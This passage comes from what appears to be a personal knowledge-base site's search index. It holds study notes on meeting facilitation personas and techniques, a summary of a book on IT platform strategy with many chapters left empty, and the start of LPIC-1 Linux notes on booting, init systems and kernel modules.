Steadiness/Conscientiousness Strengths: May be the proverbial \u0026ldquo;canary in the coal mine\u0026rdquo; stating something the group is not ready to hear/discuss yet. Weaknesses: May feel like a personal attack to whomever is speaking Could shut down the space/topic How To Deal: \u0026hellip;todo Persona: Analytical Anil # Typical Quotes: We need more data We simply don\u0026rsquo;t know enough to decide this right now. DISC Style: Conscientiousness Strengths: Provides accuracy \u0026amp; details Keeps the group from going off a cliff they don\u0026rsquo;t see. Weaknesses: Analysis Paralysis May overgeneralize to the point of people losing interest all together. How To Deal: Driven By: Safety Handled By: Make them feel safe, by outlining what the outcomes the decision at hand will have. Give them the context that the decision is made, and what for. Give them all the information they should know to feel safe to make a decision. Give Them Reassurance! Persona: Cautious Connie # Typical Quotes: This is too risky Maybe we should wait this out \u0026amp; see what happens DISC Style: Conscientiousness Strengths: Has safety \u0026amp; quality as top priorities Keeps the group from going off a cliff they don\u0026rsquo;t see. Weaknesses: Risk averse, may loose opportunities for growth by waiting too long. How To Deal: Driven By: Safety Handled By: Make them feel safe, by outlining what the outcomes the decision at hand will have. Give them the context that the decision is made, and what for. Give them all the information they should know to feel safe to make a decision. Give Them Reassurance! Persona: Negative Ned # Typical Quotes: This will never work We tried this before \u0026amp; it didn\u0026rsquo;t work then\u0026hellip; it\u0026rsquo;s not gonna work now DISC Style: Conscientiousness/Dominance Strengths: Keeps the group grounded in reality of impediments to success. Weaknesses: Shoots down potentially good ideas before they are fully formed. How To Deal: Driven By: Resistance Handled By: Allow them to get rid of their negative opinions, ask for their opinions proactively. Then bounce back to them \u0026ldquo;What would you do or suggest\u0026rdquo;? Try to make them an expert. Persona: Work-a-holic Warren # Typical Quotes: I\u0026rsquo;ve got more important things to do This meeting is a waste of my time\u0026hellip; I have real projects that need my attention DISC Style: Dominance Strengths: Brings awareness tha the current process/topic may not be adding value. Weaknesses: Disengagement may spread to others (who will soon be getting out their laptops) Voice will be left out of the conversation if he is doing other work How To Deal: \u0026hellip;todo Persona: Dominating Don # Typical Quotes: ELMO! Are we done yet? When will we move to action? DISC Style: Dominance Strengths: Keeps the ball moving forward; moves teams from talking about it into action! Weaknesses: Can shut down a space with potentially overbearing energy. How To Deal: Handled by: They need to feel important Give an important task, so the task gives them an outlet. Giving them an opportunity to present themselves. People who dominate conversation # Flip The Role: Pretext your question with a request for the busy talkers to hold of. People who talk a lot know they talk a lot.\nExample: \u0026ldquo;Hey, if you\u0026rsquo;re typically one of the first people to speak, please hold back and wait to be one of the last (or 3th) to speak, is is possible might not get a chance to speak this time, but I\u0026rsquo;d love to hear some of the voices that not always get heard.\u0026rdquo; This is less directed towards individuals (e.g. hey Mark, I didn\u0026rsquo;t hear you yet.) Creating Space: Create more space/silence for those who are a bit more hesitant to speak, to get their chance.\nTo avoid awkward silence to create productive silence. Build on top of the \u0026ldquo;Flip The Role\u0026rdquo; , by also pretexting, that you want a specific time window before anyone answers, so every can think for a moment. Example: \u0026ldquo;Hey, if you\u0026rsquo;re typically one of the first people to speak, please hold back and wait to be one of the last (or 3th) to speak, is is possible might not get a chance to speak this time, but I\u0026rsquo;d love to hear some of the voices that not always get heard. I am going to ask this question, and then pause in total silence for 5 seconds to wait for everyone to think of their own response before we share.\u0026rdquo; Even if the 5 seconds pass, let them take the time. Change the mechanics: Domination could be because of the people, but because of the structure of the meeting.\nSplit out into groups to have discussions (breakout sessions) and then report back what you heard other people in your group say (not what you said). Steering into the curve: Address the elephant in the room, address this privately first. This is more closer to \u0026ldquo;last resort\u0026rdquo; if others don\u0026rsquo;t work.\nPull person aside: What I\u0026rsquo;d love you to do, I love all your contributions and I am recognizing your contributions are heavier than others and I\u0026rsquo;d like to make space for voices. Can you aim to bear through this awkward silence to give space to other people to share. They won\u0026rsquo;t be surprised about it or new about it that they\u0026rsquo;re dominant about it. You can do it publicly but risky: \u0026ldquo;I can notice we are playing white guy ping-pong, can we step back for a moment and make space for other voices (example from a meeting where it happened the most heavy voices were white, including the facilitator)\u0026rdquo; YouTube Video: Deal with dominant people in conversation\nTools \u0026amp; Equipment # Pens Post-its Flip Charts Projector Miro Software Playbooks/runbooks Playbook # Playbook/runbook Necessary for each event. Clear agenda, duration of each section, expectations of facilitation, expectations of the participants, materials needed. Example State Purpose State Outcome State all steps, each step has a number for easy reference Time length (start/stop times optionally) Activity description Materials required Parking Lot # Technique for difficult participants A placeholder for issues or questions that might need to be dealt with, but at a later point in the session/meeting/workshop. You can either address all of the items at a specific time, or else in 1:1\u0026rsquo;s (e.g. during lunch) but make CLEAR when you will address these. Even if you know these questions will be answered over the workshop, write it down, let them feel heard and appreciated. Goal: Avoid the workshop derailing and explode in discussion. Let people feel heard. It allows them to let go what\u0026rsquo;s in their head, so they can relax more. Examples \u0026ldquo;This is not something we will deal/address now, but I have a section at the end for rapid fire questions and such, what I will do is add this to the parking lot so we can pick it up at the end.\u0026rdquo; \u0026ldquo;I Understand where you are coming from, I have a lot of things to say about that, if you don\u0026rsquo;t mind trusting the process, I will get back to that (putting that in the parking lot)\u0026rdquo;. YouTube Video: Parking Lot Method\nVisualization Techniques # \u0026hellip; See hard copy papers\nGeneral Topics # Failure Reasons # Reasons a facilitation/event can fail.\nPeople don\u0026rsquo;t come prepared or don\u0026rsquo;t do homework (only 30% does it). People don\u0026rsquo;t engage. Wrong people in the room. Participants hogging all the time. Cultural differences and mistakes. People Who Are Late # Fill them in during break, respect others time. DISC # Allows to identify different personalities. If you are able to locate/place your participants, it will be easier to tailor your messaging accordingly.\nRemote Workshops # Be even more clear on purpose, actions and agenda Time in 1 Hour blocks in 4 steps Short theory Discussion/exercise Presentation/reflection Break 10min break/hour Break out groups max 4 people to keep engagement + accountability Encourage to keep video on. Not just politeness, but also more engaging. Distribute air time among participants. Randomly ask different participants questions to keep em on their toes. Emphasize start and end Check in question to have everyone focus on the event Have enough wrap-up time Meeting Formats # Lean Coffee # raw a simple Kanban board with three columns : Todo, In Progress and Done. This board will help the participants visualize the progress during the discussion. After a quick introduction allow 5 minutes to the participants to individually brainstrom topic ideas. Ask everyone to write a post-it note for each topic they want to discuss. Everyone takes turn and quicky pitch his ideas: What topics they want to discuss and why. Each topic ideas is added to the TODO column on the board. You have an overview of all the topics the individuals want to talk about. Each participant is granted two votes. Voting twice for the same item is permitted. Everyone gather around the board and put a dot on their two favorites topics. Add all votes and priorize/order the topics on the board: the most voted item will be discussed first. If thereâs a lot of ideas on the board some items probably did not received any votes: you will not discuss those topics during the session. This is a great way to avoid boring discussion: you only talk about what is interesting to the group. Once you have a prioritized list of the topics you want to discuss, you can move the top item into the In Progress column. Set a timer to 5 minutes and youâre now ready to discuss the topic. Discuss the topic until the time is out ! Have a silent roman vote: thumb up if you want to continue the discussion, thumb down if you want to move to the next topic. If you have a majority of thumbs up : reset the timer and continue the discussion. If you have a majority of thumbs down: move the topic to the Done column and move to the next topic ! At the end of the session take time to elicit key take-aways: what did we learn ? What actions can we take ?* Source\nPersonal Ideas # Use the business idea testing experiments to make a list of potential facilitation events. How can we use the wisdom of writing clearly, structuring thoughts and the thought process for facilitation events? A small assignment where we ask people to write and think for themselves before joining? Think about how this lady with math, asking students to write first 5 min on how they would go about solving something a math problem that was information incomplete (âhow would you try to solve this, if i were to give more informationâ). Quote from WAC [T]alk is important for sharing, clarifying, and distributing knowledge among peers, while asking questions, hypothesizing, explaining, and formulating ideas together are all important mechanisms during peer discussions. Analytical writing is an important tool for transforming rudimentary ideas into knowledge that is more coherent and structured. Furthermore, talk combined with writing appears to enhance the retention of science learning over time. (566)\nCan we use Blooms Taxonomy for facilitating ? Use the Coaching Habit questions as inspiration of what you try to get from an activity (Acitvity Types). For some people, you can use a small kan ban as a visual facilitation tool. Resources # YouTube Channel: Chad Littlefield YouTube Channel: Facilitating XYZ YouTube Channel: AJ\u0026amp;Smart YouTube Channel: Adriana Girdler (Project Management)) YouTube Channel: workshop.work (Podcast on Workshop Facilitation) YouTube Channel: North Star Facilitators Book: Pocket Guide to Facilitating Human Connection - Touches on Experiential Facilitation Book: Ask Powerful questions - Touches on Dialogue Facilitation YouTube Video: How To Think Faster YouTube Video: Deal with dominant people in conversation Training: The Effective Facilitator YouTube Video: Process Facilitation Explained "},{"id":54,"href":"/it-strategy/","title":"It Strategy","section":"","content":" IT Strategy # Platform Strategy "},{"id":55,"href":"/it-strategy/platform-strategy/","title":"Platform Strategy","section":"It Strategy","content":" Platform Strategy # A critical success factor for platforms is defining which aspectsc an be harmonized and which ones must be kept variable. A good platform takes a step in the background of the participant to participant interaction. How users access your platform is at least as important as what\u0026rsquo;s inside. Part I : Understanding platforms # When people say platform, they mean different things. That\u0026rsquo;s why it\u0026rsquo;s wise to first look at the history of platforms, catalog different types of platforms, and highlight their benefits.\nChapter 1: Key properties of platforms # Properties:\nPlatforms Elevate: A platforms creates an elevated layer that others can stand on. Platforms Enable: Platforms value by allowing participants ot benefit from the presence of others. E.g buyers/sellers, creators/follows, Platforms Democratize: Platforms make it easiy for participants to join thanks to lower barriers. E-Commerce platforms allows sellers easier to find markets, pay-what-you-use on cloud Platforms Self-Perpetuate: Platforms enabling exchange between participants (virtual/physical goods) Network effect: More sellers attracts more buyers which again attracts more sellers This compounds well with the \u0026ldquo;Enable\u0026rdquo; property. Easy entry makes sure nohing stands in the way. Platforms Accelerate: Platforms remove any blockers and heavy lifting, so participant can focus much more on value creating tasks and innovation. Things can go faster. Here is where one can focus their time on differentiating tasks. Platforms Don\u0026rsquo;t Constrain: They don\u0026rsquo;t limit or put unnecessary constrains on the participants. Examples # Automotive platforms: Same components and chassis used across models, along to create many different models with little redesign. E-commerce platforms: Online marketplaces where sellers and buyers can find each others, removing all the effort to create ways to find and iteract with each other. It connects sellers and buyers directly with each other. An online supermarket not, it\u0026rsquo;s being the in between middleman. Media Platforms: Social media, they make it easy to create and share or follow and interact Cloud platforms: Bit like dcars, all this heavy lifiting engineering components eaily accessible. Business Platforms: Do what cloud platforms did for it. Applications that added capabilities for customization. See CRM, ERP, \u0026hellip; Go SaaS Allow for customization Golden combination Freeway/highway: There is one way to get somewhere really fast, but you\u0026rsquo;re limited on when to get on and off. Chapter 2: The different types of platforms # Model/Type Examples Value Proposition Interaction Implementation Marketplace Airbnb, Ebay, amazon Facilitate Transactions Browser, Mobile, App, API Propriety Base Cloud Providers Rapidly provision IT resources Console, CLI, API, automation Proprietary + OSS Developer Portals, cloud \u0026ldquo;wrappers\u0026rdquo; Increase speed, reuse, governance Portal, CLI Composed from OSS Business Capability Allianz, Syncier, About You Build an open ecosystem APIs, Custom Integration Proprietary, on top of base platforms Models can be combined.\nMarketplace: Platform allows for farmers market model Participants: Sellers/Buyers Platform Takes care of: Search, ads, reviews, ranking, fraud and maybe payments. Platfrom benefits from: Not maintaing inventory and various ways to generate revenue through fees. Considerations: The positive feedback cycle between buyers/sellers also posses a chicken-egg problem when launching. Flexibility in fees help in inventivicing the balance, if there is a lack of sellers, seller fees wont help. There is a big \u0026ldquo;Winner takes all\u0026rdquo; issue Base: Participants: Developers and IT professionals Aim for feature parity across interaction channels (API, GUI, CLI, \u0026hellip;) Reduce cognitive load for new platform users (reducing friction for new users). How users acces your platform is at least as important as what\u0026rsquo;s inside. Developer: In-House developer platforms are built by IT Departmens to provide reuse of common IT services, boost productivity and assure compliance with operational guidelines. Usually these are in support of the Software Development Lifecycle. Sometimes these platforms create to much limitation that it defeats the purpose to be able to innovate. Business Capability: What a base platform is in business, delivering typical entire capabilities for business with the freedom to extendm customize and integrate with other systems via APIs. Part II: A Strategy for platforms # Building platforms requires a sizeable investment and a clear strategy. That strategy must turn the objectives into an actionable path defined by meaningful decisions.\nChapter 3: Formulating a Strategy # What is Strategy # Strategy is not complex. But it is hard. It\u0026rsquo;s hard because it forces people and organizations to make specific choices abotu their future - something that doesn\u0026rsquo;t happen in most companies. Meaningful strategies must connect dots between long-term vision and short-ter, tactics, between busines and IT, and between quantifiable success metrics and beliefs. A strategy tells HOW to reach a goal, nut just list the goals.\nA sound strategy depends on your organization\u0026rsquo;s unique:\nAssets: Brand, people, IP, Equipment, Cash, Technology,\u0026hellip; Constraints: Resources, Labor Contacts, Regulatory Environment, \u0026hellip; Environment: Competitors, market positioning, price pressure, \u0026hellip; Which also menas you can\u0026rsquo;t copy someone else\u0026rsquo;s strategy.\nIT Strategy vs Business Strategy # Historically IT strategy was basically \u0026ldquo;to accomedate the business\u0026rdquo; strategy, a one way street Nowadays technology can influence business strategy, we have two way street now Some business strategies are only viable thanks to advances in technology Technology allows now to sell extra services or charge \u0026ldquo;per consumption\u0026rdquo; It is technology that enables new business strategy Think in the First Derivative # Or: Think about how things change over time rather than focusing solely on their current state.\nA platform strategy should think in the rate of change.\nDocumenting A Strategy # A good strategy consists of:\nCapturing key decisions Covered in all the rest Document them well Aim For Emphasis Over Completeness: Defining what\u0026rsquo;s most relevant is a critical step towards devising a strategy. See forest if you don\u0026rsquo;t concern yourself with each tree, the real high level. \u0026ldquo;What is not included\u0026rdquo; can be very useful chapter. Remember, clear writing Use Conceptual Models: 2x2 matrixes, like SWOT See more on wikipedia Wardley Maps Show the path and the terrain A point: Where do you want to go? (+where you are?) A Path: How will you get there? A Terrain: What happens when you step of the path? This shows how you see past happy-day scenarios Credible roadmap # Simple linear road maps are unrealistic, foresee decision points, possible paths to be taken and the data needed to make those decisions.\nFrom Strategy to Execution # Take a list of all the \u0026ldquo;benefits\u0026rdquo; that you aim for and structure in a logical sequence of goals/mechanisms. An example structure that works:\nContext: Explain why you are following a platform strategy. How does it align with the business strategy. Objectives: The business benefits that are intended to be delivered by the strategy. Must be the TOP Objectives, not all benefits, less is more here. E.g. Cost Reduction, faster innovation, \u0026hellip; Mechanisms: Well-known techniques to deliver your objectives. Be very cautious to not just list buzzwords. E.g. Increase code reuse, enable team autonomy Design Decisions: Specific trade-offs that are made during implementation E.g. All use the same programming language in return for x, y and Z Level Description Key Activity Example Context Why you are create a strategy Link to business Increase Competition Objective What you want to achieve Prioritization Speed up delivery Mechanism Common ways to get there Translate Objectives Design Decision Trade-offs you are making Explain Well Standard APIs Strategy is a Winding Road # A strategy is not a detailed plan but an overall direction.\nChapter 4: Becoming a Platform Company # Transformation starts with new ways of thinking, followed by new ways of working, which results (hopefully) new end products that disrupt. To transform you must think and work differently. The misunderstanding is that there are only 2 options: Full harmonization, stifling innovation Rapid innovation, entropy and chaos These are actually 2 dimensions where we need to find the right balance. (Proper) Harmonization drives innovation, cause you can focus on higher level issues instead of lower level. (Like Azure, Low-Code and No-Code does). It\u0026rsquo;s important that harmonization does not depend on putting constraints. Harmonize by common APU standards and reuse across diverse languages. There are ways to provide harmony/reuse, without constraints, by having a reuseable part behind an API, that part is extracted out of what developers else had to do in their own language. Removing constraints is the key innovation driver. Characteristic Perceived Opposite Enabling Mechanism Standards Innovation Platforms, Interface Standards Speed Quality Automation Cost Agility Modularity, Iterations Economies of Scale Economies of Speed Cloud Platforms Openness Monetization Professional open source Low Risk Change Automated Tests, Continuous Delivery Control Chaos Transparency, automated governance Short-term gain Long-term gain Adaptability, low friction Alignment of the business and technology models are a force multiplier if well aligned. But misaligned, and all is often doomed. A misalignment between business and technology teams dooms the most promising platform initiatives. Chapter 5: The Platform Paradox # The paradox: How we destroy the conflict of standardization vs innovation? How do we solve this?\nPlatforms break the dichotomy between harmonization and innovation. Cloud platforms are a great example of high harmonization, yet boosting innovation and not constraining. You put certain constraints, so you can remove others. Example: HTTPS is a standard, which allowed various browsers to be created and interoperate. IT Pyramid Fallacy Old school way of doing things, anything applying to entire business is shared and more unique things for specific units and geographies are configured. Its flawed as in: You have to anticipate all users needs, which is impossible and kills innovation. Even if you do it well, the base layer is a massive effort. Platforms Aren\u0026rsquo;t pyramids Platforms don\u0026rsquo;t try to anticipate every use case. If your users haven\u0026rsquo;t built something that surprised you, you probably didn\u0026rsquo;t built a platform. The Double Double Pyramid How Platforms Break Barriers Componentization: Allows for recomposition (e.g. standard-sized bricks sped up construction without reducing creative possibilities) Requires an overarching architecture that defines boundaries and connecting elements. The right boundary matters to make it reusable and recompensable. Separating commodity from differentiators: Bake widely used functions in common layer and components, which is not an easy task. Anything widely used (commoditized) goes into base layer, rest (differentiating, value creating) goes on top. The line is hard to draw due to: Needs vary by user group: Groups see what fits in the platform different The boundary shifts: IT evolves, so do the needs of a platform (first it was IaaS, then PaaS, then FaaS) Cohesion over precision: A precise line between Commodity/Differentiators does not always result in good cohesion, users expect cohesion of a platform. Interaction Matters: How users access the platform is as important as what\u0026rsquo;s inside of it. Done by commodification of services in a way which relinquishes an amount of control ans is open to extension. Building Economies of Speed on Economies of Scale: By taking advantage of the scale, speed should also thrive (see how fast you can deploy a webapp on Azure) due to frictionless usage. Platforms thrive on scale (see cloud) Freeing users from the scale effects and pain points, allows them to have speed in what they want to do. Speed is what encourages experiments and innovation. Easy and Fast is what allows for innovation. Cloud platforms provide scale-optimized technology as a speed-oriented product. See example where lower lays change slower than higher layers, like the 19\u0026quot; server rack standard is from 1922, but K8S is from a few years ago or months ago. Centralizing Decentralization: Centralize expertise Decentralize innovation Done by commodification of services in a way which relinquishes an amount of control ans is open to extension. , Chapter 6: Mapping Platforms # (Visual) maps are great to depict strategies and reveal their shortcomings.\nMaps As Visual Models: A good map is easy to understand but are also based in reality. Which Map Is Best? Know which question you\u0026rsquo;re trying to answer, before choosing a (visual) model. Maps can be great to answer questions about IT strategies. 6 Basic Elements of Maps Visual representation Context (what question are we answering) Orientation Anchor (e.g North Compas) Components The Position of the components. The movement of the components. 2x2 Maps Simple models provide highest abstraction and are often most useful Examples contains Context, Orientation, Components, and even movement. Wardley Mapping At intersection of Technical Capability and Business Value. 2 dimensional Y-axis: Value Chain (how visible or vicinity is it to the user) Dependencies between components flow from TOP (visible to user) to BOTTOM (less visible to user) Relative positioning, so no procession necessary X-axis: Evolution Stage of the component Genesis - Newly Discovered Custom Built - Uncommon, we still learn about Product - Increasingly common and repeatable Commodity - Highly Standardized Components are \u0026ldquo;Technologies\u0026rdquo; being plotted. Movements, components move on 2 mechanisms Commoditization: Horizontal move towards commodity. Componentization allows systems to be broken down into identifiable reusable pieces that can move independently towards commoditization. Goal: Commoditization to standard components leads to an explosion of innovation for higher-order systems. Example Compute resources: Going from custom built to commodity Default Stack: LAMP stack also created commodity. This map allows for working out your IT/Platform Strategy, where you are and where you are going. Chapter 7: A Simple Framework For Writing IT Strategy # Instead of using a rigid template, focus on the following characteristics for writing IT strategy.\nAlignment: Must align with a business strategy Must support the business today and in the future. Business Strategy IT Strategy Platform Strategy, in both directions! Define metrics which are meaningful to the business (instead of IT vanity metrics) Business doesn\u0026rsquo;t care how many servers are migrated to the cloud. Value is the only real progress Clarity: Must be easily understood by broad audience Technique: Conceptual models can gop a long way in clarity. Technique: Describe strategy in horizontal layers of detail. Going from high level, executive summary to lower details. Evolution: Strategies are meant to last, but must evolve based on opportunities, shifting priorities and changing constraints. A purpose of a strategy is to tell how to cope with uncertainty. That\u0026rsquo;s why its a strategy, not a plan. A strategy is supposed to absorb changes and evolve over time. 2 Levels Evolution of the elements described in the strategy. Evolution of the strategy itself. Decisions: Must make decisions, else its just a list of wishes. Strategy is a series of meaningful decisions, those that require conscious trade-offs. We forgo X in return for Y. Part III: Building In-House platforms # Most IT organizations experience platforms when they set out to build one. This part looks beneath the covers of such platform initiatives to highlight important characteristics.\nChapter 9: In-House IT Platform # Benefits: Reduce Cost: By reuse and economies of scale Increase velocity: Accelerate and speed up new development Assure Compliance: Scaleable compliance Improve Transparency: Reduce Lock-In: Abstraction Layer IT Platform Classifications By McKinsey Customer Journey Platforms: Reusable elements that define the customer proposition/experience. Coarse-grained functional components (e.g. Click-And-Collect on eCommerce platformm) Business Capability Platforms: Business solutions (e.g. Payment Services, Inventory Management) These capabilities are intended to be modular and can be wired together These capabilities support the customer journey Core IT Platforms: Provide shared technology on which \u0026ldquo;customer journeys\u0026rdquo; and/or \u0026ldquo;Business Capabilities\u0026rdquo; run on. E.g. Cloud Platform, Data Analytics Platform, \u0026hellip; By ThoughtWorks Service Platforms: Main offering to be used by the customer. Digital Business Platforms: extend the service platform integrated with partners via APIS. Foundational Technology Platforms: Similar to Core IT. Seems very similar to the McKinsey model. IT Platform Varieties Digital Platforms: Goals Enable new business models Provide better customer/employee experience Assure efficient, reliable and data-driven operations Interaction Platform: Powers websites, mobile apps, and APIs to connect customers and to partners. Business Capability Platform: Provides functions to support the business domain (e.g. payment services, e-commerce catalog, \u0026hellip;) Base/Cloud Platform: All elements for operational IT parts. Data Analytics Platform: For doing analytics, ML, create new insights, optimize things, get KPIS Analysis: Run the risk of being seen as a cure for any and all IT ailments Long adaption is risky, must be guided by clear road map with intermediate deliverables and value achieved. Engineering Productivity Platforms/Internal Developer Platforms Software delivery tooling determines your organization\u0026rsquo;s rate of change. Economies of speed, provide tools for faster delivery and change. Provide necessary components for: Building Deploying Operating Analysis Done well, the harmonization can provide higher compliance, security, allowing for speed AND quality. Data Platforms: Goal for being more data-driven. Analysis Due to onboarding friction usually, the fail to democratize access to the platform. Adding a new data source is often labour intensive. Just centralized data dumps Data Meshes: Attempts to fix the limitations of centralized data systems/platforms by separating the innovation layer from the platform layer. Again, following economies of speed, built on economies of scale. 4 Pillars Decentralize data domain ownership Data as a product, including ease of use, secure access and trust Abstract the infra complexity into a common self-service data platform to reduce friction Providing federated governance API Platforms: Can utilize open-source service meshes like Istio/Kong. Allowing to get more metrics and control. Typical capabilities Proxies to monitor and route service calls (e.g. Envoy Proxy) API Gateways (auth, quota, throttling, \u0026hellip;) Self-Service portals for developers Certificate management for secure communication Catalog/Registry for API Discovery Stream or Event handling Monitoring/Dashboards Abstraction Layers/Cross-Platform Platforms: Just an abstraction layer for portability Usually strong focus on vendor-locking is not so important. In general, not really useful. Platforms and Software as a service: Platforms are often offered as SaaS. Self Service + pricing reduces friction Not all SaaS are platforms SaaS is distribution, operational, and pricing model. Platforms are abstractions tha enable teams to build on top of them. Chapter 10: IT Platform and IT services are Opposites # From a static structural model a \u0026ldquo;platform\u0026rdquo; and \u0026ldquo;Infra/Operations\u0026rdquo; seem the same, but it does not illustrate the interactions between them.\nLike, here the structure looks the same but in the first model, app development \u0026ldquo;throws their app\u0026rdquo; over the wall, and Ops people will be paged on issues. So that\u0026rsquo;s not the interaction we\u0026rsquo;re looking for, we\u0026rsquo;re more looking for a DevOps interaction between the app development and the platform.\nThat\u0026rsquo;s why, a structural model might seem the same, but the interactions can be very different.\nPlacing operational responsibility with the development team, removes organizational boundary. Platform developers are responsible for platform operations. They do dev and ops what they own. App developers are responsible for app operations. They do dev and ops what they own. The platform does provide the core tools to allow the operational parts being done by the app team. Checklist: To verify which one of the 2 types you are working with # Characteristic Platform IT Service Notes Main Driver Speed Reuse Platforms should focus on speed first, efficiency second Value Proposition Direct Indirect Scale Effect Thrives Bottleneck Marginal cost Low Medium/High Friction Low High Self Service Yes No Run as \u0026hellip; Product Project Evolution Continuous Sporadic Orientation Customer Centric Process Centric Responsibility Shared Separated Extensibility Open or Semi Open Closed Adoption Voluntary Mandated Chapter 11: Implementation Matters Using Mechanisms # Just a strategy and objectives won\u0026rsquo;t be a recipe for success, the implementation matters. You must describe how to get from X to Y. This can be done with three distinct layers\nDescribe benefits, the desired properties. Mechanisms, explains the specific technical implementation. Implementation details, explains what needs to be built. Mechanisms # Restricted Choice Golden paths are great to reduce complexity and provide governance Might eliminate useful options and slow down development (e.g. not allowing a public cloud) Whatever restriction, make sure the platform is an enabler Meaningful Defaults Softer version of restricting choice Assumptions/Scope A cloud provider must built for the whole world, an in-house platform for one organization. You can and must make more assumptions than a cloud provider, which translates again in restricting choice and meaningful defaults. Aggregation Platform creates uniform access to many elements. Abstractions See chapter 21 for more depth Automation Automate friction away. Functional Addition Platforms should give extra functions on top of the layer it is built on, filling in gaps. Business Objective Mechanism Implementation Minimize Mistakes Meaningful defaults Templates Increase velocity Automation IaC scripts Improve products Fill product gaps New components Enforce compliance Restrict choice Wrappers Reduce lock-in Abstraction Service Layers Chapter 12: Make opinionated platforms, not restrictive ones, what\u0026rsquo;s the difference? # The best software takes sides, decide on your vision, and run with it. Instead of FULL flexibility. This is valid for products and product design. You are not designing/developing for a broad market, but for a niche, your organization. Opinionated is the strategy that frameworks also choose for expecting higher speed. (e.g. convention over configuration with Ruby On Rails). Having opinions improves the developer experience. 3 Key Properties for opinionated # Transparency: Be transparent about the opinions, don\u0026rsquo;t hide them, make them clear and the chosen/expected trade-off. By taking opinions, we can expect a high return on that. Gentle/forgiving slopes/edges: Developer experience should be still good even when trying to do something outside of the \u0026ldquo;sweet spot\u0026rdquo;. Mechanism: \u0026ldquo;Default overrides\u0026rdquo; or \u0026ldquo;Escape hatches\u0026rdquo; from the golden path Multiple Opinionated(s) # There can be multiple opinionated frameworks/platforms based on needs/preferences. Having only \u0026ldquo;one opinionated\u0026rdquo; will work if the return is really high Open Source can afford to be opinionated # As they\u0026rsquo;re not have financial goals to have a big reach.\nPlatforms have high cohesion # Chapter 13: Platform Decisions To Think Off # A trap is during a platform development cycle is making decisions without being aware of it.\nOpen/Closed Closed: Limited input from platform users, rare, but can be valid in cases of regulation and certification (e.g. PCI). Feature Requests: Platform team encourage input and feature requests from platform users. A feature request does not necessarily get implemented as requested, platform team must protect the platform. Marketplace: Platform users can\u0026rsquo;t modify the platform but components on top, to be shared with other users. Extension API: Users can develop components that become part of the platform via dedicated extension APIs. (e.g. Kubernetes Operators and Kubernetes API) Co-Development: InnerSourcing by having users be active contributors. Mandatory/Voluntary Voluntary usually encourages actual good developer experience (free market dynamics), but can be time consuming to promote and adapt. Life expectancy Communicate expected life expectancy or philosophy. Change Management Change is necessary, how is this done, how long are older APIs supported? Etc\u0026hellip; Preconditions/Assumptions What skills/culture is expected to be in place for users to adopt the platform Chapter 14: Buy or DIY platform? # Chapter 15 # Part IV: Designing platforms # Platforms hide complexity, but building one isn\u0026rsquo;t nearly as simple as it looks from the outside. This part employs metaphors to illustrate platform design decisions.\nChapter 16 # Chapter 17 # Chapter 18 # Chapter 19 # Chapter 20 # Chapter 21 # Chapter 22 # Part V: Implementing platforms # This part investigates platform anatomies and propose common platform blueprints.\nChapter 23 # Chapter 24 # Chapter 25 # Part VI: Growing platforms # Platforms have to be rolled out across the organization. They also require delicate care and feeding over time so that they don\u0026rsquo;t fall victim to excessive entropy or become a bottleneck. This part shows you how to do this successfully.\nChapter 26 # Chapter 27 # Chapter 28 # Chapter 29 # Chapter 30 # Part VII: Organizing for platforms # If you are building platforms, you\u0026rsquo;ll likely need a platform team, which is different from typical application delivery or operation teams. This part describes how to build an manage a platform team.\nChapter 31 # Chapter 32 # Chapter 33 # Chapter 34 # Todo # cover Shared responsibility model (chatper 10 apparently? page 70) Resources # Platform Strategy by Gregor Hohpe "},{"id":56,"href":"/linux-lpic-1/","title":"Linux Lpic 1","section":"","content":" LPIC-1 # About Linux # Components of Linux\nBoot Loader Software manages boot process till the OS starts to load The Kernel Core of OS, manages OS, CPU and peripherals Daemons Processes lurking in the background that start during booth or after login (e.g. time) Shell Graphical Server Subsystem to display graphic AKA x-server Desktop Environment Actual GUI for the user Applications Why Linux ?\nFree Stable Secure Open Source Free to run the program for any purpose. Free to study how the program works Free to change how the program works Free to redistribute copies Distributions\nWhat is a distribution ? Collection of software Package management system Helps you install, upgrade and remove software Keeps your server up to date Popular Examples Red Hat CentOS (based on red hat) Fedora Debian Ubuntu Mint SuSE Gentee Arch \u0026hellip; VirtualBox Bridged Networking\nIf you do this, instead of NAT, you can SSH into the box instead of using the VirtualBox UI System Architecture # Boot the system\nUEFI is the new version of BIOS BIOS booting -\u0026gt; BIOS boot from particular disk -\u0026gt; This disk has a MBR (Master Boot Record), which stores the Boot Loader -\u0026gt; The boot loader knows where the kernel is on disk and boot the OS UEFI UEFI Boot Loader (which lives on your disk) (is not in the MBR) This boot loader calls the kernel, which boots the OS MBR : Information in the first sector of a disk that tells where and how the OS is. GRUB (Grand Unified Bootloader) : Boot loader package that supports multiple OS\u0026rsquo;s on a ps You can modify the settings during bootup and make them persist by directly modifying the config files used by the GRUB For Ubuntu in VirtualBox, tap esc during bootup Kernel is lowest level of replacable software to your hardware Once the Kernel has attached the root file system, it will run a program called init init is always the first process ran by a linux system, therefor, it gets always a PID of 1 There are a few different init programs that exist sysvinit : Which based on sysv, oldest and first systemd : Low memory boot process, mainstream, almost used everywhere now upstart : Created by Ubuntu, but they switched to systemd in the end. quiet for kernel param is supress most boot messages. So less verbosity for bootup Determine and configure hardware settings\nudev : Device manager for your kernel Gives low level access to the linux device tree Handles user space events (happens when hardware is removed or added to the system) Eg. Loading firmware Provided by temporary filesystem (tmpfs) This is how udev provides access, which is mounted to /dev on startup /etc/udev/rules.d : Folder for custom rules for the device manager udev. You can create rules for what should happen/ran when something is plugged in or unplugged dbus Inter-process communication mechanism Framework that allows processes to talk to each other Secure Reliable Provides high level OOP interface sysfs Virtual filesystem Presents information about various kernel subsystems Hardware devices Drivers Mounted to /sys procfs Similar to sysfs Presents information about various processes Presents information about system information mounted to /proc Can be used to interface with the kernel Change parameters on the fly Each running process will have a directory in /proc/\u0026lt;PID\u0026gt; + various other stuff eg. /proc/cmdline -\u0026gt; Kernel name from bootup eg. /proc/version -\u0026gt; Kernel version eg. /proc/cpuinfo -\u0026gt; CPU info lsmod List all Kernel modules in use and by which modules modprobe Add or remove loadable kernel modules to/from the kernel udev relies upon modprob to load drivers for automatically detected hardware rmmod Remove kernel module (prob need root for that) lspci Shows all PCI connected devices to the system Show Device IRQ settings Runlevels and boot targets\nRun Level : Number between 0 \u0026lt;-\u0026gt; 6 (max 9), determines which scripts/programs are run Levels : 0 - Halt or shut down system 1 - Single user mode 2 - Multi user mode without networking 3 - Normal boot (multi user mode + networking) 4 - 